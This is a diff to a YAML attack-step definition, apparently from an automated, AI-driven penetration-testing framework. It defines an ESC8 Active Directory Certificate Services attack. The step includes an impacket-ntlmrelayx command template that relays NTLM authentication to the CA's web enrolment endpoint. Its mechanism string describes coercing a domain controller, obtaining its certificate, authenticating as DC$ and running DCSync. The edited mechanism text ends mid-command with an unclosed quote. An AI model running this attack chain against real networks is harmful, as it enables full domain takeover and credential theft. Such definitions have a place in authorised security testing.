@@ -7,13 +7,15 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: impacket-ntlmrelayx -t 'http://{ca_ip}/certsrv/certfnsh.asp' --adcs
   --template '{template}'
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- relay_to_adcs_success
+- certificate_obtained
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: 'ESC8: Web enrollment endpoint accepts NTLM relay. Coerce DC → relay to
-  /certsrv → get DC certificate → auth as DC → DCSync.'
+mechanism: '**Mechanism**: PetitPotam/PrinterBug coerces DC → relay to HTTP endpoint
+  of ADCS Web Enrolment → request DC certificate using the relayed NetNTLM auth →
+  PKINIT with the resulting cert as DC$ → DCSync. **Command**: `ntlmrelayx.py -t http://CA/certsrv/'
 hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
